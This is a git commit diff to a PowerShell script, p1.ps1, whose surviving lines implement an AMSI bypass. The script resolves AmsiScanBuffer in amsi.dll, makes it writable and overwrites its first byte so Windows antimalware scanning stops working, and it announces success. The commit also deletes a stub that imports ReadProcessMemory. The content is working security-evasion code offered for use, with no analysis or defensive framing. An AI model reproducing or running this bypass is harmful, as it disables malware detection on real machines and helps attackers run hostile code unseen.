0eea6fc05345479d9acdc5a5d469dd48e5bda286
KeyStrOke <KeyStrOke.M95@gmail.com>
2024-11-21 12:11:26 +0100

    Update p1.ps1

--- p1.ps1
+++ p1.ps1
@@ -13,31 +13,10 @@ public class AmsiBypass {
 "@
 Add-Type $s
 
-$a = [AmsiBypass]::LoadLibrary('amsi.dll')
-$b = [AmsiBypass]::GetProcAddress($a, 'AmsiScanBuffer')
+$a = [AmsiBypass]::LoadLibrary("amsi.dll")
+$b = [AmsiBypass]::GetProcAddress($a, "AmsiScanBuffer")
 $p = [IntPtr]::Size -eq 8 ? 0xC3 : 0x33
 [void][AmsiBypass]::VirtualProtect($b, [uint32]1, 0x40, [ref]0)
 [System.Runtime.InteropServices.Marshal]::WriteByte($b, $p)
 
 Write-Host "[*] AMSI bypass successfully applied."
-
-# Function Declaration
-function ObfuscatedFunction {
-    param (
-        $InitOffset = 0x50000,
-        $NegOffset = 0x50000,
-        $MaxOffset = 0x1000000,
-        $ReadSize = 0x50000
-    )
-    $APIs = @"
-using System;
-using System.Runtime.InteropServices;
-public class ObfAPIs {
-    [DllImport("kernel32.dll")]
-    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesRead);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-}
-"@
-    Add-Type $APIs
-}
